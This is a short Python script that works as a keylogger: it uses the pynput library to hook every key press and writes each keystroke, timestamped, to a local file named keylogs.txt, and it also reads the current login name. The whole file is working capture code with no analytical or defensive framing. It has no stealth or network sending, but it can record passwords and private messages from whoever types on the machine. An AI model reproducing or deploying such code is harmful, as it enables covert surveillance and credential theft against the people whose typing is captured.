from pynput.keyboard import Listener

import os
import logging

username = os.getlogin()

logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")


def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()